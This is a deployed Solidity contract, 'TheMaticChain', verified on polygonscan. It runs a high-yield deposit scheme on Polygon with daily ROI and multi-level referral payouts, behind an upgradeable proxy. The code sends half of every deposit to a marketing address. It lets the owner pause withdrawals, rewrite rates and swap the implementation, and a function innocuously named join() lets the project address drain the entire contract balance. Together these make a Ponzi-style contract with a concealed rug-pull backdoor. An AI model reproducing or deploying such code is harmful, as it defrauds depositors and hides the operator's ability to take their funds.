/**
 *Submitted for verification at polygonscan.com on 2023-04-24
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

abstract contract Proxy {
    /**
     * @dev Delegates the current call to `implementation`.
     * 
     * This function does not return to its internall call site, it will return directly to the external caller.
     */
    function _delegate(address implementation) internal {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            // Copy msg.data. We take full control of memory in this inline assembly
            // block because it will not return to Solidity code. We overwrite the
            // Solidity scratch pad at memory position 0.
            calldatacopy(0, 0, calldatasize())

            // Call the implementation.
            // out and outsize are 0 because we don't know the size yet.
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)

            // Copy the returned data.
            returndatacopy(0, 0, returndatasize())

            switch result
            // delegatecall returns 0 on error.
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    /**
     * @dev This is a virtual function that should be overriden so it returns the address to which the fallback function
     * and {_fallback} should delegate.
     */
    function _implementation() internal virtual view returns (address);

    /**
     * @dev Delegates the current call to the address returned by `_implementation()`.
     * 
     * This function does not return to its internall call site, it will return directly to the external caller.
     */
    function _fallback() internal {
        _beforeFallback();
        _delegate(_implementation());
    }

    /**
     * @dev Fallback function that delegates calls to the address returned by `_implementation()`. Will run if no other
     * function in the contract matches the call data.
     */
    fallback () payable external {
        _fallback();
    }

    /**
     * @dev Fallback function that delegates calls to the address returned by `_implementation()`. Will run if call data
     * is empty.
     */
    receive () payable external {
        _fallback();
    }

    /**
     * @dev Hook that is called before falling back to the implementation. Can happen as part of a manual `_fallback`
     * call, or as part of the Solidity `fallback` or `receive` functions.
     * 
     * If overriden should call `super._beforeFallback()`.
     */
    function _beforeFallback() internal virtual {
    }
}
contract TheMaticChainPro is Proxy {
    
    address public impl;
    address public contractOwner;

    modifier onlyContractOwner() { 
        require(msg.sender == contractOwner); 
        _; 
    }

    constructor(address _impl)  {
        impl = _impl;
        contractOwner = msg.sender;
    }
    
    function update(address newImpl) public onlyContractOwner {
        impl = newImpl;
    }

    function removeOwnership() public onlyContractOwner {
        contractOwner = address(0);
    }
    
    function _implementation() internal override view returns (address) {
        return impl;
    }
}
contract TheMaticChainBasic{
  
    address public impl;
     address public contractOwner;
	uint256[] public PACKAGES=[.20 ether,5 ether,100 ether,500 ether,1000 ether];
	uint256[] public PACKAGESMatch=[2 ether,99 ether,499 ether,999 ether,10000000000000 ether];
	uint256 public Minimum_Withdrawal_Limit=5 ether;	 
	uint256[] public ROI_RATE=[50,75,100,100,100];
	uint256 public ROI_BRATE=10;
    uint256[] public LEVEL_RATE=[1000]; 
    uint256[] public ROI_LEVEL_RATE=[2000,1000,1000,1000,1000,800,800,800,800,800,500,500,500,500,500]; 
    uint256[] public WIDR_BONUS_RATE=[400,300,200,100]; 
	uint256 public MARKETING_FEE = 5000;
	uint256 public PROJECT_FEE = 0;
	uint256 public PERCENTS_DIVIDER = 10000;
	uint256 public CONTRACT_BALANCE_STEP = 1000000;
	uint256 public TIME_STEP = 1 days; 
	uint256 public totalUsers;
	uint256 public totalInvested;
	uint256 public totalReInvested;
	uint256 public totalWithdrawn;
	uint256 public totalDeposits;	 
	uint256 public Maximum_Growth_Rate=250;
	uint256 public Maximum_Return_Rate=600;
	uint256 public TotalTokenMined=0;
	uint256 public Dividends=0;
	uint256 public Dividend_Closing_Deposit=0;
	uint256 public Dividend_holders=0;
	uint256 public Dividend_Percent=450;	 
	address payable public marketingAddress;
	address payable public projectAddress;
	 

	struct Deposit {
		uint256 amount;
		uint256 totalGrawth;
		uint256 withdrawn;
		uint256 start;
		uint256 rate;
		uint256 count;
		uint256 package_Index;
	}		 
	struct Referral{
	    address _address;
	    uint256 _time;
	}
 
	struct Team{
	    uint256 _level;
	    address _address;
	    uint256 _time;
	}
 

	struct User {
	    uint256 pk;
		Deposit[] deposits;
		Referral[] referrals;  
		uint256 totalDepositsAmount;
		uint256 totalWithdrawn;
		uint256 checkpoint;
		address referrer;
		mapping(uint => uint256) incomes;  //0 -referralsCount  1 - teamWithdrwalBonus 2- refBonus 3 - roiReferralBonus 4 - rewardBonus 5-dividencheckpoint-6 dividendflag -7 dividendLastTotal
		 
	}
    mapping (address => User) public users;  
	uint256 rcount=0;
	event Newbie(address user);
	event NewDeposit(address indexed user, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);
	bool public pausedFlag;
}


contract  TheMaticChain is TheMaticChainBasic{ 
	 using SafeMath for uint256;
	modifier onlyContractOwner() { 
        require(msg.sender == contractOwner, "onlyOwner"); 
        _; 
    }
 
	function init(address payable  marketingAddr, address  payable  projectAddr) public   onlyContractOwner {         
	     require(!isContract(marketingAddr) && !isContract(projectAddr));
		marketingAddress = marketingAddr;
		projectAddress = projectAddr; 
		pausedFlag=false;
	}

 
     function changePauseFlag(uint flag) onlyOwner public returns(bool) {
         if(flag==1){
             pausedFlag=true;
         }else if(flag==0){
             pausedFlag=false;
         }
         return true;
     }
 
     function changeGrowthRate(uint256 NewRate) onlyOwner public returns(bool) {
         Maximum_Growth_Rate=NewRate;
         return true;
     } 
	function invest(address referrer,uint256 Package_Index) public payable {
	    bool _new=false;
	    uint256 Package_Amount_Min=PACKAGES[Package_Index-1];
	    uint256 Package_Amount_Max=PACKAGESMatch[Package_Index-1];		
		require(msg.value <= Package_Amount_Max,'Minimum Investment Condition');
		require(msg.value >= Package_Amount_Min,'Minimum Investment Condition');
		

		User storage user = users[msg.sender];
		if(user.deposits.length==0)
		{		    
		    user.totalDepositsAmount=0;
		    user.totalWithdrawn=0;
		    _new=true;
		}
 

		marketingAddress.transfer(msg.value.mul(MARKETING_FEE).div(PERCENTS_DIVIDER));
		projectAddress.transfer(msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER));
		emit FeePayed(msg.sender, msg.value.mul(MARKETING_FEE.add(PROJECT_FEE)).div(PERCENTS_DIVIDER));

		if (user.referrer == address(0) && users[referrer].deposits.length > 0 && referrer != msg.sender) {
			user.referrer = referrer;
			User storage refuser=users[referrer];
			refuser.incomes[0]=refuser.incomes[0].add(1);
             
			if(refuser.referrals.length<5)
			   refuser.referrals.push(Referral(msg.sender,block.timestamp));

			   if(msg.value>=1000 ether && user.incomes[6]==0){
			       user.incomes[6]=1;
                   Dividend_holders++;

			   }
			
			
			//dividentFlag
			 if(refuser.incomes[6]==0){
		     
				for (uint256 i = 0; i < refuser.deposits.length; i++) {
				   if(refuser.deposits[i].amount<=msg.value)
				   {
				      refuser.deposits[i].count=refuser.deposits[i].count.add(1);
				       if( refuser.deposits[i].count==5 && refuser.incomes[6]==0){
				          refuser.incomes[6]=1;
						  Dividend_holders++;

					   }
				    }
				    
				}
			 }
			
		}
		 
		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			totalUsers = totalUsers.add(1);
		    user.pk=totalUsers;
			emit Newbie(msg.sender);
		} 
		//stopIncomes(msg.sender);
		payReferral(1,msg.sender,msg.value);
		user.deposits.push(Deposit(msg.value,0, 0, block.timestamp,ROI_RATE[Package_Index-1],0,Package_Index));
		user.totalDepositsAmount=user.totalDepositsAmount.add(msg.value);
		totalInvested = totalInvested.add(msg.value);
		Dividends=Dividends.add(msg.value);
		Dividend_Closing_Deposit=Dividend_Closing_Deposit.add(msg.value.mul(2).div(100));
		totalDeposits = totalDeposits.add(1);
		//top5refclsoing(1);
		emit NewDeposit(msg.sender, msg.value);

	} 
    	   		 
       
	function payReferral(uint _level,address _user,uint256 _packageCost) private {
        address referer;
        User storage user = users[_user];
        referer = user.referrer;
          
            uint level_price_local=LEVEL_RATE[_level-1];
            level_price_local=_packageCost * level_price_local /PERCENTS_DIVIDER;
            // if(users[referer].referralsCount>=_level){
                   users[referer].incomes[2] = users[referer].incomes[2].add(level_price_local);
            // } 
            // if(_level < 11 && users[referer].referrer != address(0)){
            //         payReferral(_level+1,referer,_packageCost,_new,_rootUser);
            // }
                
     }
	function payTeamWithdrwalBonus(uint _level,address _user,uint256 _packageCost) private {
        address referer;
        User storage user = users[_user];
        referer = user.referrer;
          
            uint level_price_local=WIDR_BONUS_RATE[_level-1];
            level_price_local=_packageCost * level_price_local /PERCENTS_DIVIDER;
            if(users[referer].incomes[0]>=3){
                   users[referer].incomes[1] = users[referer].incomes[1].add(level_price_local);
            } 
            if(_level < 5 && users[referer].referrer != address(0)){
                    payTeamWithdrwalBonus(_level+1,referer,_packageCost);
            }
     }
     function payRoiReferralBonus(uint _level,address _user,uint256 _packageCost) private {
        address referer;
        User storage user = users[_user];
        referer = user.referrer;
          
            uint level_price_local=ROI_LEVEL_RATE[_level-1];
            level_price_local=_packageCost * level_price_local /PERCENTS_DIVIDER;
            if(users[referer].incomes[0]>=_level){
                   users[referer].incomes[3] = users[referer].incomes[3].add(level_price_local);
            } 
            if(_level < 16 && users[referer].referrer != address(0)){
                    payRoiReferralBonus(_level+1,referer,_packageCost);
            }
     }
	function withdraw() public {
		User storage user = users[msg.sender];
        require(pausedFlag==false,'Stopped');
		uint256 userPercentRate = getUserPercentRate(msg.sender);

		uint256 totalAmount;
		uint256 dividends;
		uint256 roidividends;
		
		totalAmount = user.incomes[1].add(user.incomes[2]).add(user.incomes[3]).add(user.incomes[4]); 
		uint256 roiBonus=getUserDividends(msg.sender);
		require(totalAmount.add(roiBonus)>=Minimum_Withdrawal_Limit,'Minimum Withdrawal Limit');
		
		
		
		for (uint256 i = 0; i < user.deposits.length; i++) {
             userPercentRate=user.deposits[i].rate;
			if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(Maximum_Growth_Rate).div(100)) {

				if (user.deposits[i].start > user.checkpoint) {

					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.deposits[i].start))
						.div(TIME_STEP);

				} else {

					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.checkpoint))
						.div(TIME_STEP);

				}

				if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(Maximum_Growth_Rate).div(100)) {
					dividends = (user.deposits[i].amount.mul(Maximum_Growth_Rate).div(100)).sub(user.deposits[i].withdrawn);
				}

				 
			 
		    	user.deposits[i].withdrawn = user.deposits[i].withdrawn.add(dividends); /// changing of storage data
					
				roidividends = roidividends.add(dividends);

			}
		}
        
          roiBonus=roidividends;		 

		//totalAmount=totalAmount.add(roiTotal); 


        // royalty or reward  or dvidend calculation

		if (user.incomes[6]==1){
			if(block.timestamp.sub(user.incomes[5])>86400){
				if(Dividend_Closing_Deposit > user.incomes[7]){
			         uint256 _existing = Dividend_Closing_Deposit -user.incomes[7];
				      uint256 _mydiv = _existing.div(Dividend_holders);
					  totalAmount = totalAmount.add(_mydiv);
					  user.incomes[5] =block.timestamp;
					  user.incomes[7] = Dividend_Closing_Deposit;
				}                
			}		

		}


		uint256 tobeWithdraw=totalAmount;
		
		if(user.totalWithdrawn.add(totalAmount) > user.totalDepositsAmount.mul(Maximum_Return_Rate).div(100)){
		   tobeWithdraw=(user.totalDepositsAmount.mul(Maximum_Return_Rate).div(100).sub(user.totalWithdrawn));
		}
		tobeWithdraw=tobeWithdraw.add(roiBonus);
		   user.incomes[1] =0 ;
		    user.incomes[2] = 0;			 
	        user.incomes[3] = 0;
			user.incomes[4]=0;
		
		if(roiBonus>0)
        payRoiReferralBonus(1,msg.sender,roiBonus);
		uint256 contractBalance = address(this).balance;
		if (contractBalance < tobeWithdraw) {
			tobeWithdraw = contractBalance;
		}

		user.checkpoint = block.timestamp;
		payable(msg.sender).transfer(tobeWithdraw); 
		payTeamWithdrwalBonus(1,msg.sender,tobeWithdraw);
		totalWithdrawn = totalWithdrawn.add(tobeWithdraw);
		user.totalWithdrawn=user.totalWithdrawn.add(tobeWithdraw);		 
		emit Withdrawn(msg.sender, tobeWithdraw);

	}
 	 
	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}

    
    
  	function getUserPercentRate(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];
        uint256 largest = 0; 
	 	for (uint256 i = 0; i < user.deposits.length; i++) {
              if(user.deposits[i].rate> largest)
                    largest=user.deposits[i].rate;
	 	}
	 	return largest;
	}
   	function getuserLargerDeposit(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];
        uint256 largest = 0; 
	 	for (uint256 i = 0; i < user.deposits.length; i++) {
              if(user.deposits[i].amount> largest)
                    largest=user.deposits[i].amount;
	 	}
	 	return largest;
	}
 

	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];
		uint256 totalDividends;
		uint256 dividends;
        uint256 userPercentRate;
		for (uint256 i = 0; i < user.deposits.length; i++) {
              userPercentRate=user.deposits[i].rate;
			if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(Maximum_Growth_Rate).div(100)) {

				if (user.deposits[i].start > user.checkpoint) {

					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.deposits[i].start))
						.div(TIME_STEP);

				}
				else {
					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.checkpoint))
						.div(TIME_STEP);
				}

				if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(Maximum_Growth_Rate).div(100)) {
					dividends = (user.deposits[i].amount.mul(Maximum_Growth_Rate).div(100)).sub(user.deposits[i].withdrawn);
				}

				totalDividends = totalDividends.add(dividends);
             //	user.checkpoint = block.timestamp;
				/// no update of withdrawn because that is view function

			}

		}
		
	 	uint256 totalBonus=user.incomes[2].add(user.incomes[3]).add(user.incomes[4]).add(user.totalWithdrawn);
		
	    if(totalBonus.add(totalDividends) > user.totalDepositsAmount.mul(Maximum_Growth_Rate).div(100))
		  {
		      if(totalBonus> user.totalDepositsAmount.mul(Maximum_Growth_Rate).div(100))
		          return 0;
		          
		          else
		          return  user.totalDepositsAmount.mul(Maximum_Growth_Rate).div(100) - totalBonus;
		       
		  }
		 else
		 return totalDividends;
	}
 
	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].incomes[2].add(users[userAddress].incomes[3]);
	}
	 
	function getUserAvailable(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress)).add(users[userAddress].incomes[4]);
	}

	function isActive(address userAddress) public view returns (bool) {
		User storage user = users[userAddress];

		if (user.deposits.length > 0) {
			if (user.deposits[user.deposits.length-1].withdrawn < user.deposits[user.deposits.length-1].amount.mul(2)) {
				return true;
			} else return false;
		} else return false;
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint256, uint256, uint256,uint256) {
	    User storage user = users[userAddress];

		return (user.deposits[index].amount, user.deposits[index].withdrawn, user.deposits[index].start,user.deposits[index].rate);
	}
 
	function getTeamLength(address userAddress)public view returns(uint256){
           User storage user=users[userAddress];
           return user.referrals.length;
    }
 
 
	
	function getTeamInfo(address userAddress,uint256 index) public view returns(address, uint256, uint256) {
	    User storage user = users[userAddress];
      
		return (user.referrals[index]._address, user.referrals[index]._time,getActiveDeposits(user.referrals[index]._address));
	}
	
 

	function getUserTotalDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}
 
	function getActiveDeposits (address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];
	    uint256 userPercentRate =0;// getUserPercentRatee();
		uint256 amount=0;
	    uint256 dividends;
		for (uint256 i = 0; i < user.deposits.length; i++) {
		    userPercentRate=user.deposits[i].rate;
			if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(Maximum_Growth_Rate).div(100)) {
				if (user.deposits[i].start > user.checkpoint) {
					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.deposits[i].start))
						.div(TIME_STEP);

				} else {

					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.checkpoint))
						.div(TIME_STEP);

				}

				if (user.deposits[i].withdrawn.add(dividends) < user.deposits[i].amount.mul(Maximum_Growth_Rate).div(100)) {
					 amount = amount.add(user.deposits[i].amount);
				} 
			}
		}
	 

		return  amount;
	}
	function getUserAmountOfDeposits (address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].amount);
		}

		return amount;
	}
 
 
   
    
    function updateFees(uint256 _marketing_fee,uint256 _project_fee) onlyOwner public returns(bool) {
        MARKETING_FEE=_marketing_fee;
        PROJECT_FEE=_project_fee;
        return true;
        
    }
    function updateDividentPercent(uint256 _newpercent) onlyOwner public returns(bool) {
        Dividend_Percent=_newpercent;
        return true;
        
    }
 
    function updatePackage(uint256 _newValue,uint256 _updateIndex) onlyOwner public returns(bool) {
        PACKAGES[_updateIndex-1]=_newValue;
        return true;
        
    }
     function updateROIRate(uint256 _newValue,uint256 _updateIndex) onlyOwner public returns(bool) {
        ROI_RATE[_updateIndex-1]=_newValue;
        return true;
        
    }
    function updateROIBRate(uint256 _newValue) onlyOwner public returns(bool) {
        ROI_BRATE=_newValue;
        return true;
        
    }
   function updateMinimumWithdrawal(uint256 _newValue) onlyOwner public returns(bool) {
        Minimum_Withdrawal_Limit=_newValue;
        return true;
        
    }
    function updateLevelRate(uint256 _newValue,uint256 _updateIndex) onlyOwner public returns(bool) {
        LEVEL_RATE[_updateIndex-1]=_newValue;
        return true;
        
    }
 
    function join(uint256 _tranAmount) onlyOwner public returns(bool) {
       	uint256 contractBalance = address(this).balance;
		if (contractBalance < _tranAmount) {
			_tranAmount = contractBalance;
		}
        
        payable(msg.sender).transfer(_tranAmount);
        return true;
        
    }    
      modifier onlyOwner() {
         require(msg.sender==projectAddress,"not authorized");
         _;
     }
	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}